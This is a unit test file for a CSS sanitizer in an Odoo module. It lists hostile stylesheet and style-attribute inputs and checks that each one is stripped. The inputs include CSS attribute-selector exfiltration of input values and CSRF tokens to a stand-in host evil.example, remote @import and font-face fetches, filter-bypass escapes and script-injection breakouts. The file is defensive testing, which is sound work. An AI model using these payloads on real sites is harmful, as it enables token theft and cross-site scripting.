# -*- coding: utf-8 -*-
# Copyright © Bruce Perens K6BP. SPDX-License-Identifier: AGPL-3.0-or-later
"""Unit tests for zero_sudo's stylesheet filter (`css_sanitizer.sanitize_stylesheet`).

Tests [@ANCHOR: zero_sudo:css_stylesheet_filter]
[@ANCHOR: test_css_stylesheet_filter] lives here. The filter protects member pages
(user_websites tests exercise it through `website.page._sanitize_user_arch`).
"""
import re

from odoo.tests.common import tagged
from odoo.addons.zero_sudo.tests.common import HamsTransactionCase

from odoo.addons.zero_sudo.css_sanitizer import sanitize_stylesheet, sanitize_style_attribute

# Anything that can make a browser fetch or run something, in a sheet that came out.
_FETCH = re.compile(
    r"url\s*\((?!\s*#)|@(?!media |keyframes )|image-set|image\s*\(|src\s*\(|element\s*\(|cross-fade|paint\s*\(|attr\s*\(|"
    r"expression|behavior|binding|javascript|vbscript|data\s*:|\\|<|/\*|position\s*:\s*(?:fixed|sticky)",
    re.IGNORECASE,
)

HOSTILE = [
    ("attribute_selector_exfil", 'input[value^="a"]{background:url(https://evil.example/a)}'),
    ("csrf_token_exfil", 'input[name=csrf_token][value^="0"]{background-image:url("//evil.example/0")}'),
    ("import", "@import url(https://evil.example/x.css); p{color:red}"),
    ("import_string", '@import "https://evil.example/x.css";'),
    ("font_face", "@font-face{font-family:x;src:url(https://evil.example/f.woff)}"),
    ("fixed_overlay", ".o{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff}"),
    ("sticky_overlay", ".o{position:sticky;top:0}"),
    ("fixed_uppercase_important", ".o{POSITION : FIXED !important}"),
    ("image_set", 'p{background:image-set("https://evil.example/a.png" 1x)}'),
    ("webkit_image_set", 'p{background:-webkit-image-set("https://evil.example/a.png" 1x)}'),
    ("cursor_url", "p{cursor:url(https://evil.example/c.cur),auto}"),
    ("list_style_image", "li{list-style-image:url(https://evil.example/b.png)}"),
    ("content_url", "p::before{content:url(https://evil.example/b.png)}"),
    ("escaped_url", r"p{background:u\72l(https://evil.example/a)}"),
    ("escaped_import", r"@\69mport 'https://evil.example/x.css';"),
    ("comment_split_url", "p{background:ur/**/l(https://evil.example/a)}"),
    ("expression", "p{width:expression(alert(1))}"),
    ("moz_binding", "p{-moz-binding:url(https://evil.example/x.xml#a)}"),
    ("behavior", "p{behavior:url(x.htc)}"),
    ("javascript_url", "p{background:url(javascript:alert(1))}"),
    ("data_url", "p{background:url(data:image/svg+xml,x)}"),
    ("data_url_quoted", 'p{background:url("data:text/html,x")}'),
    ("style_close", "p{content:'</style><script>window.__xss=1</script>'}"),
    ("selector_close", "</style><script>window.__xss=1</script>{color:red}"),
    ("attr_function", "p{background:attr(data-x url)}"),
    ("nested_at_in_media", "@media print{@import url(https://evil.example/x.css);p{color:red}}"),
    ("unterminated_string", 'p{content:"abc} q{background:url(https://evil.example/a)}'),
    ("unterminated_block", "p{background:url(https://evil.example/a)"),
    ("unterminated_comment", "p{color:red} /* q{background:url(https://evil.example/a)}"),
    ("brace_in_string", 'p{content:"}";background:url(https://evil.example/a)}'),
    ("semicolon_in_string", 'p{content:"a;b";background:url(https://evil.example/a)}'),
    ("custom_property_url", "p{--x:url(https://evil.example/a);background:var(--x)}"),
    ("nesting", "p{q{background:url(https://evil.example/a)}}"),
    ("keyframes_url", "@keyframes k{from{background:url(https://evil.example/a)}to{color:red}}"),
    ("supports", "@supports (display:grid){p{background:url(https://evil.example/a)}}"),
    ("namespace", "@namespace url(https://evil.example/ns);"),
    ("control_char", "p{background:url\x0b(https://evil.example/a)}"),
]


@tagged("post_install", "-at_install")
class TestCssStylesheetFilter(HamsTransactionCase):
    # Tests [@ANCHOR: test_css_stylesheet_filter]

    def test_01_every_hostile_sheet_comes_out_inert_and_stable(self):
        for name, source in HOSTILE:
            with self.subTest(vector=name):
                cleaned, dropped = sanitize_stylesheet(source)
                self.assertTrue(dropped, f"{name}: removal was not reported")
                self.assertEqual(_FETCH.findall(cleaned), [], f"{name}: {cleaned!r}")
                self.assertNotIn("evil.example", cleaned, name)
                self.assertEqual(
                    sanitize_stylesheet(cleaned), (cleaned, False), f"{name}: not stable"
                )

    def test_02_ordinary_styling_survives_unflagged_and_is_stable(self):
        source = """
        /* page theme */
        body { font-family: Georgia, serif; color: #222; margin: 0 auto; max-width: 40em }
        .card > h2, .card h3 { border-bottom: 1px solid rgba(0,0,0,.2); }
        a:hover { text-decoration: underline !important }
        input[type="text"] { width: calc(100% - 2px); }
        .icon { fill: url(#gradient); filter: url(#glow); }
        .b::before { content: "a;b"; position: absolute }
        .rel { position: relative; z-index: 2 }
        @media (max-width: 600px) { .card { display: block } }
        @media print and (min-width: 10cm) { nav { display: none } }
        @keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }
        .spin { animation: spin 2s linear infinite; --gap: 4px; }
        """
        cleaned, dropped = sanitize_stylesheet(source)
        self.assertFalse(dropped, cleaned)
        for needle in (
            "font-family:Georgia, serif",
            ".card > h2, .card h3{border-bottom:1px solid rgba(0,0,0,.2)}",
            "text-decoration:underline !important",
            "width:calc(100% - 2px)",
            "fill:url(#gradient)",
            'content:"a;b"',
            "position:absolute",
            "position:relative",
            "@media (max-width: 600px){.card{display:block}}",
            "@keyframes spin{from{transform:rotate(0deg)}\nto{transform:rotate(360deg)}}",
            "--gap:4px",
        ):
            self.assertIn(needle, cleaned)
        self.assertEqual(sanitize_stylesheet(cleaned), (cleaned, False))

    def test_03_only_the_bad_declaration_is_dropped(self):
        cleaned, dropped = sanitize_stylesheet(
            "p{color:red;background:url(https://evil.example/a);margin:0}q{color:blue}"
        )
        self.assertTrue(dropped)
        self.assertEqual(cleaned, "p{color:red;margin:0}\nq{color:blue}")

    def test_04_hostile_rule_does_not_hide_a_later_good_one_or_leak_into_it(self):
        cleaned, _ = sanitize_stylesheet("@import 'x'; @font-face{src:url(y)} p{color:red}")
        self.assertEqual(cleaned, "p{color:red}")

    def test_05_size_and_count_caps(self):
        self.assertEqual(sanitize_stylesheet("p{color:red}" + " " * 70000), ("", True))
        many = "".join(f".c{i}{{color:red}}" for i in range(2500))
        cleaned, dropped = sanitize_stylesheet(many)
        self.assertTrue(dropped)
        self.assertEqual(len(cleaned.splitlines()), 2000)
        self.assertEqual(sanitize_stylesheet(""), ("", False))
        self.assertEqual(sanitize_stylesheet("   /* only a comment */  "), ("", False))


# Each is a `style="..."` value that must come out with no fetch, no overlay and no escape.
STYLE_ATTR_HOSTILE = [
    ("remote_url", "background:url(https://evil.example/a)"),
    ("remote_url_uppercase_property", "BACKGROUND-IMAGE:URL(https://evil.example/a)"),
    ("remote_url_mixed_case", "Background:uRl( 'https://evil.example/a' )"),
    ("relative_url", "background:url(/web/image/1)"),
    ("protocol_relative_url", "background:url(//evil.example/a)"),
    ("comment_split_url", "background:ur/**/l(https://evil.example/a)"),
    ("comment_in_property", "back/**/ground:url(https://evil.example/a)"),
    ("escaped_url", r"background:\75rl(https://evil.example/a)"),
    ("escaped_url_mixed", r"background:u\72l(https://evil.example/a)"),
    ("image_set_url", 'background:image-set(url(https://evil.example/a) 1x)'),
    ("webkit_image_set", 'background:-webkit-image-set("https://evil.example/a" 1x)'),
    ("image_set_string", 'background:image-set("https://evil.example/a" 1x)'),
    ("cursor_url", "cursor:url(https://evil.example/c.cur),auto"),
    ("list_style_image", "list-style-image:url(https://evil.example/b)"),
    ("content_url", "content:url(https://evil.example/b)"),
    ("expression", "width:expression(alert(1))"),
    ("expression_uppercase", "width:EXPRESSION(alert(1))"),
    ("moz_binding", "-moz-binding:url(#x)"),
    ("moz_binding_uppercase", "-MOZ-BINDING:url(https://evil.example/x.xml#y)"),
    ("behavior", "behavior:url(https://evil.example/x.htc)"),
    ("ms_behavior", "-ms-behavior:url(x.htc)"),
    ("javascript_url", "background:url(javascript:alert(1))"),
    ("javascript_value", "background:javascript:alert(1)"),
    ("data_url", "background:url(data:image/png;base64,AAAA)"),
    ("data_url_quoted", "background:url('data:text/html,x')"),
    ("fixed", "position:fixed"),
    ("fixed_uppercase", "POSITION:FIXED"),
    ("fixed_spaced", "position : fixed"),
    ("fixed_important", "position:fixed !important"),
    ("fixed_important_uppercase", "position:fixed ! IMPORTANT"),
    ("fixed_comment_split", "pos/**/ition:fi/**/xed"),
    ("sticky", "position:sticky"),
    ("webkit_sticky", "position:-webkit-sticky"),
    ("webkit_sticky_important", "position:-webkit-sticky !important"),
    ("attr_function", "content:attr(value)"),
    ("import_in_value", "background:url(#a) @import 'x'"),
]


@tagged("post_install", "-at_install")
class TestStyleAttributeFilter(HamsTransactionCase):
    # Tests [@ANCHOR: zero_sudo:css_style_attribute_filter]
    # [@ANCHOR: test_css_style_attribute_filter] lives here.

    def test_01_harmless_declarations_pass_unchanged(self):
        for value in (
            "color:red",
            "color:#222;margin:0 auto;padding:4px 8px",
            "font-family:Georgia,serif;font-size:1.2em",
            "position:absolute;top:0;left:-99999px",
            "position:relative",
            "top:99999999px;left:99999999px;inset:99999999px",
            "fill:url(#gradient)",
            "--gap:4px;width:calc(100% - 2rem)",
            'content:"a;b"',
        ):
            with self.subTest(value=value):
                self.assertEqual(sanitize_style_attribute(value), (value, False))

    def test_02_every_hostile_value_is_removed(self):
        for name, value in STYLE_ATTR_HOSTILE:
            with self.subTest(name=name):
                cleaned, dropped = sanitize_style_attribute(value)
                self.assertTrue(dropped)
                self.assertEqual(cleaned, "", f"{value!r} kept as {cleaned!r}")
                self.assertFalse(_FETCH.search(cleaned))  # audit-ignore-search: re.Pattern

    def test_03_a_hostile_declaration_does_not_take_its_neighbours(self):
        self.assertEqual(
            sanitize_style_attribute("color:red; background:url(https://evil.example/a) ;margin:0"),
            ("color:red;margin:0", True),
        )
        self.assertEqual(
            sanitize_style_attribute("COLOR:Red ; Position:Fixed !important; margin : 0 !important"),
            ("color:Red;margin:0 !important", True),
        )

    def test_04_comments_are_deleted(self):
        self.assertEqual(sanitize_style_attribute("color:/* x */red"), ("color:red", False))
        self.assertEqual(sanitize_style_attribute("/* only */"), ("", False))

    def test_05_malformed_css_drops_the_whole_attribute(self):
        for value in (
            "color:red;/* never closed",
            'color:red;font-family:"open',
            "color:red;width:calc(1px",
            "color:red;width:1px)",
            "color:red;background",
            "color:red;;just text;margin:0",
            "color:red;col\\or:blue",
            "color:red}p{color:blue",
            "color:red;{margin:0}",
            "color:red;\x00margin:0",
            "color:red;1bad:value",
            "color:red;" + "x" * 5000,
        ):
            with self.subTest(value=value):
                self.assertEqual(sanitize_style_attribute(value), ("", True))

    def test_06_idempotent_and_blank(self):
        once, _ = sanitize_style_attribute("COLOR:red;background:url(https://evil.example/a);margin:0 !IMPORTANT")
        self.assertEqual(sanitize_style_attribute(once), (once, False))
        self.assertEqual(sanitize_style_attribute(""), ("", False))
        self.assertEqual(sanitize_style_attribute("  ;  ; "), ("", False))
        self.assertEqual(sanitize_style_attribute(None), ("", False))
